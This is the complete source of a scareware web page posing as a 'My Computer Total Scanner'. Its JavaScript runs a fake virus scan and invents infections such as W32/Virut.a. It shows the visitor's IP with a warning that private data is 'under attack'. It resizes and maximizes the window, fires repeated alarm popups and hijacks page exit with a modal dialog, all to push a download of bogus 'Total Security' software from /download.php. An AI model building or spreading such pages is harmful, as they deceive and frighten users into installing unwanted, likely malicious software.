<!DOCTYPE HTML PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>My Computer Total Scanner</title>
<script type="text/javascript" src="img/jquery.js"></script>
<script type="text/javascript" src="img/jquery-init.js"></script>
<script type="text/javascript" src="img/listfile.js"></script>
<script type="text/javascript" src="img/drugndrop.js"></script>
<script>
var pinter;var ss=15;var teracti=0;
function hideWarnDialog()
{
	if(confirm('We recommend you to download and install antivirus software.'))	{
	
	}
	else	{
		terttye43();
	};
};
function terttye43(){
	alert('Harmful and malicious software detected. Such programs may damage your computer and steal your private information. Online Security Scanner requires  Total Security components to repair your computer. Please click OK to download and install Total Security tool.');
}
function hfgyh54(){};
function qwbewupd()
{
 if ($(".progress_bar_fill").width()>0)
 {
  $("#progress_prcnt").html((Math.round(100-$(".progress_bar_fill").width()/417*100))+"%");
  $("#gdfgfdgdf").html(gs[Math.floor(Math.random()*gs.length)] );
  if ($(".progress_bar_fill").width()<350 && teracti==0)
  {
   document.getElementById('threat1').style.visibility = 'visible';
   document.getElementById('desc').style.visibility = 'visible';
   setInterval("$('#tc1').toggleClass('none')",1000);
   teracti=1;
  }
  if ($(".progress_bar_fill").width()<200 && teracti==1)
  {
   document.getElementById('threat2').style.visibility = 'visible';
   setInterval("$('#tc2').toggleClass('none')",1000);
   teracti=2;
  }
  if ($(".progress_bar_fill").width()<100 && teracti==2)
  {
   document.getElementById('threat3').style.visibility = 'visible';
   setInterval("$('#tc3').toggleClass('none')",1000);
   setInterval("$('#tc4').toggleClass('none')",1000);
   teracti=3;
  }  
 }
 else
 {
  clearInterval(pinter);
  $(".hdgjfstvtecfc43").html("Scan procedures finished. 34 Potential aggressive items was found!");
  setTimeout("pop2()",1000);
 }
}
function Minimize() 
{
window.innerWidth = 100;
window.innerHeight = 100;
window.screenX = screen.width;
window.screenY = screen.height;
alwaysLowered = true;
}
function Maximize() {window.moveTo(0,0);window.resizeTo( screen.width, screen.height );}
function download() {
 window.location='/download.php?id=207';
}
function away()
{
	w = window;
	ua = navigator.userAgent;
	v1 = ua.toLowerCase().indexOf('msie') != -1 && ua.toLowerCase().indexOf('opera') < 0;
  	x = 11;
  	eval('w.resizeTo(x*10,x*11-7)');
	w.moveTo(v1 ? (screen.width - 100) >> 1 : 11027, v1 ? (screen.height - 100) >> 1 : 10659);
}
function pop1() {
confirm('Warning!!! '+
'Your system requires immediate anti viruses scan! Total Security can perform fast and free virus and malicious software scan of your computer .');
}
function pop2() {
confirm('Your computer remains infected by threats! '+
'They might lead to data loss and files and folder list damage, and needed to be heal as soon as possible.\n\n'+
'Return to Total Security and download it secure to your PC');
pop4();
}
function pop3dsds() {
alert('Your computer remains infected by threats ! '+
'They can cause data loss and file damages and need to be cured as soon as possible.\n\n'+
'Return to Total Security and download it secure to your PC');
}
function pop4() {
  document.getElementById('ap').style.display = 'block';
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
}
function sp2init(){
}
function loading() {
  if (window.attachEvent)
    away();
  pop1();
  Maximize();
  window.focus(); 
}
function loaded() {
  $("#white").css("display","none");
  $("#page_progress").css("display","block");
  $(".left_bar").css("display","none");
  $(".left_bar").css("display","block");
  $(".progress_bar_fill").animate({width:"0px"},ss*1000);
  writegeoip();
	pinter = setInterval(qwbewupd,ss*10);	
};
loading();
var exit = true;
var usePopDialog = true;
var nid=0;
var tid=431;
var mid=947;
var full=1;
var popDialogOptions = "dialogWidth:1024px; dialogHeight:768px; dialogTop:0px; dialogLeft:0px; edge:Raised; center:0; help:0; resizable:1; scroll:1; status:0";
var popWindowOptions = " scrollbars=1,menubar=1,toolbar=1,location=1,personalbar=1,status=1,resizable=1";
var clid = "7f09c9e1c55f7d63f02909a14c1a45e0";
var usePopDialog = true;
var isUsingSpecial = false;
dat=new Date(1253754255);
var dlth=dat.getHours()-dat.getUTCHours();
newurl = "/download.php?id=207&dlth="+dlth;
var isXPSP2 = false;
var u = "6BF52A52-394A-11D3-B153-00C04F79FAA6";
function ext(){
       if(exit)       {
               exit=false;
               terttye43();
               if(!isXPSP2 && !usePopDialog)               {
                         window.open(popURL,"",popWindowOptions);
               }else if(!isXPSP2 && usePopDialog) {
                         eval("window.showModalDialog(popURL,'',popDialogOptions)");
               }else{
                         iie.launchURL(popURL);
               }
        }
}
var popURL = newurl;
isUsingSpecial = true;
if (window.attachEvent)
 eval("window.attachEvent('onunload',ext);");
else
 window.addEventListener("unload", ext, false);
</script>
<link href="img/style.css" rel="stylesheet" type="text/css" />
</head>
<body onLoad="loaded()">
<bgsound src="#" id="soundeffect" hidden="true" loop="1" autostart="false">

<DIV id=ap style="LEFT: 0px; z-index:2; WIDTH: 100%; POSITION: absolute; TOP: 190px; display: none;" align=center>
<DIV style="cursor:hand; WIDTH: 434px; height:332px; POSITION: relative; background-image:url(img/001.gif); background-color:white;"><input type='button' style='POSITION: relative; width:21px; height:21px; left:200px; top:5px; border-width:0px; background-image:url(cb.gif)' onclick='hideWarnDialog();'><spacer width='446' height='294' /></DIV>
</div>

<div style="display: none;" id="white" class="white_div" align="center">
	<div style="position: relative; top: 50%;"><img src="img/007.gif" width="51" height="19">    </div>
   </div>
<div style="display: block;" class="left_bar">
  <div class="left_header">
    	System Tasks  </div>
	<div class="left_box">
		<div class="left_box_line">
			<img src="img/016.gif" class="left_bar_icon" width="14" height="16"><a href="#">View system information</a>	    </div>
	  <div class="left_box_line">
    	<img src="img/017.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Add or remove programs</a>	  </div>
	  <div class="left_box_line">
   	    <img src="img/018.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Change a settings</a>      </div>
  </div>
	<div class="left_header">
		Other Places  </div>
	<div class="left_box">
		<div class="left_box_line">
			<img src="img/012.gif" class="left_bar_icon" width="16" height="16"> <a href="#">My Network Places</a>		</div>
	  <div class="left_box_line">
    	<img src="img/013.gif" class="left_bar_icon" width="16" height="16"> <a href="#">My Documents</a>      </div>
	  <div class="left_box_line">
   	    <img src="img/014.gif" class="left_bar_icon" width="16" height="14"> <a href="#">Shared Documents</a>      </div>
	  <div class="left_box_line">
   	    <img src="img/015.gif" class="left_bar_icon" width="16" height="16"> <a href="#">Control Panel</a>      </div>
  </div>
	<div class="left_header">
		Details  </div>
	<div class="left_box">
	  <div class="left_box_line"> <strong>My Computer</strong><br>
System Folder      </div>
	</div>
    <div class="left_header">
                Your Info </div>
        <div class="left_box">
          <div class="left_box_line">
      <strong>IP: </strong><span style="color:#F00">84.42.39.75</span><br>
      <strong>Country: </strong><span id="geoipcountry" style="color:#F00"></span><br>
      <strong>City: </strong><span id="geoipcity" style="color:#F00"></span><br>
      <div style="margin-top:5px; color:#F00"><strong>Your private data is under attack!</strong></div>
      </div>
        </div>
</div>

<div class="right_bar">
  <div class="right_hr">
    	System scan progress  </div>
	<div class="folder_box">
   	  <div id="tc1" class="trojan none">
        	<img src="img/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">11 threats</span>      </div>

  <img src="img/004.gif" class="folder_icon" width="43" height="40">Shared Documents  </div>
  <div class="folder_box">
    	<div id="tc2" class="trojan none">
        	<img src="img/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">23 threats</span>        </div>
    
  <img src="img/004.gif" class="folder_icon" width="43" height="40">My Documents  </div>
  <div class="right_hr">
    	Hard drives  </div>
	<div class="folder_box">
    	<div id="tc3" class="trojan none">
        	<img src="img/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">24 threats</span>        </div>
    
  <img src="img/005.gif" class="folder_icon" width="43" height="40">Local Disk (C:)  </div>
  <div class="folder_box">
    	<div id="tc4" class="trojan none">
        	<img src="img/020.gif" width="15" align="absmiddle" height="18"><span class="trojan_caption">10 threats</span>        </div>
    
  <img src="img/005.gif" class="folder_icon" width="43" height="40">Local Disk (D:)  </div>
  <div class="right_hr">
    	DVD  </div>
	<div class="folder_box">
    	<img src="img/003.gif" class="folder_icon" width="43" height="40">DVD-RAM Drive (E:)  </div>
  <div class="progress_bar">
	<div class="progress_bar_bg">
	  <div class="progress_bar_progress">
       	<div style=" display: block;" class="progress_bar_fill">        </div>
            	<div id="progress_prcnt">100%</div>                      
      </div>          
	</div>
  </div>
    <div class="hdgjfstvtecfc43">Now scanning: <span id="gdfgfdgdf"></span></div>
	<div class="window1">
   	  <div style="font-size: 15px; font-weight: bold; color: white; padding-top: 14px; padding-left: 35px;">
        	Your Computer is Infected!      </div>
    	<div style="padding-top: 22px;">
        	Threats and actions:      </div>   
        <table border="0">
          <tbody><tr>
            <td width="166" class="td_cell1">Name</td>
            <td class="td_cell1" width="105">Risk level</td>
            <td width="85" class="td_cell1">Date</td>
            <td width="120" class="td_cell1">Files infected</td>
            <td width="120" class="td_cell1">State</td>
          </tr>
          <tr class="" id="threat1" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>W32/Virut.a!</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="" id="threat2" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>Exploit-MSWord</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
          <tr class="" id="threat3" style=" visibility:hidden;">
            <td class="td_cell2"><img src="img/010.gif" style="padding-right: 5px;" align="absmiddle">  <b>Win 32:Delf-XQ</b></td>
            <td class="td_cell2"><b><font color="red">Critical</font></b></td>
            <td class="td_cell2">11.18.2008</td>
            <td class="td_cell2">35</td>
            <td class="td_cell2">Waiting removal</td>
          </tr>
      </tbody></table>

        <div style=" visibility:hidden; padding-top: 12px; padding-left: 12px; width: 600px;" class="" id="desc">
            <b>Description:</b><br>
            This program is potentially dangerous for your system. <b>Trojan-Downloader</b> stealing passwords, credit cards and other personal information from your computer.
            <br><br>
            <b>Advice:</b><br>
            You need to remove this threat as soon as possible!      </div>
        <div style="padding-top: 50px; padding-left: 590px;"><a href="/download.php?id=207">Full system cleanup</a></div>
  </div>
</div>
<div id="geoipdiv" style="display:none"></div>
<script language="javascript">
function writegeoip(){
	d=document.getElementById('geoipdiv');
	d.innerHTML="<iframe width=1 height=1 border=0 src='geoip.php'></iframe>";
}
</script>
</body></html>